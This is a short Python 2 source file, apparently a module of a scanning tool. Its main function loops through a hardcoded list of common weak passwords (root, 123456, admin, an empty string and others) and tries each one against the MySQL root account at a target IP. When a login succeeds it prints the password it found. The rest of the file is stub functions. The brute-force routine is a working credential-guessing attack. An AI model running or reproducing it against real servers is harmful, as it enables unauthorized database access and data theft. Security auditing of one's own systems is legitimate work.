#!/usr/bin/python
#coding:utf-8

def sipdeal(ip='',port='',name='',productname=''):
    print 'this is sipdeal'


def mysql(ip='',port='3306',name='',productname=''):
    head=''
    ans=None
    keywords=''
    hackinfo=''
    # apt-get install python-mysqldb
    import MySQLdb
    con=None
    passwd=['root','123456','admin','','12345','111111','password','123123','1234','12345678','123456789','696969','abc123','qwerty']
    for i in passwd:
        try:
            con= MySQLdb.connect(host=ip,port=int(port),user='root',passwd=i)
            hackinfo= ' the password is :'+i
            print ip+hackinfo
            keywords='mysql'
            break;
        except Exception,e:
            if e[0]==2003:	#Can't connect to MySQL server on ...
                keywords=''
                print e,e[0]
                break
            if e[0]==1045:	#Access denied
                print ip+'  key is not '+i
                keywords='mysql'
                continue
            else:
                keywords='mysql'
                hackinfo=str(e)
                print e,e[0]
                break;

        finally:
            if con !=None:
                con.close()
    return head,ans,keywords,hackinfo
    

def empty(ip='',port='',name='',productname=''):
    head=None
    ans=None
    keywords=None
    hackinfo=None
    print 'this is empty func'
    
    return head,ans,keywords,hackinfo
 

    

